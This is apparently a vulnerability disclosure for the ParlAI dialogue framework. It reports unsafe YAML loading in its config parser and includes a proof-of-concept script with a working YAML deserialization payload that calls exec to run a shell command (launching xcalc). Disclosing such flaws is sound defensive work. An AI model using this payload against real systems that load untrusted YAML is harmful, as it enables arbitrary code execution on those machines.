# Description
ParlAI (pronounced “par-lay”) is a python framework for sharing, training and testing dialogue models, from open-domain chitchat to VQA (Visual Question Answering).
* **Vulnerability description**
    Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept
Run exploit.py
```
import os
#os.system('pip3 install parlai')
from parlai.chat_service.utils import config
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(exploit)
config.parse_configuration_file('config.yml')
```
* `pip3 install parlai`
* `python3 exploit.py`
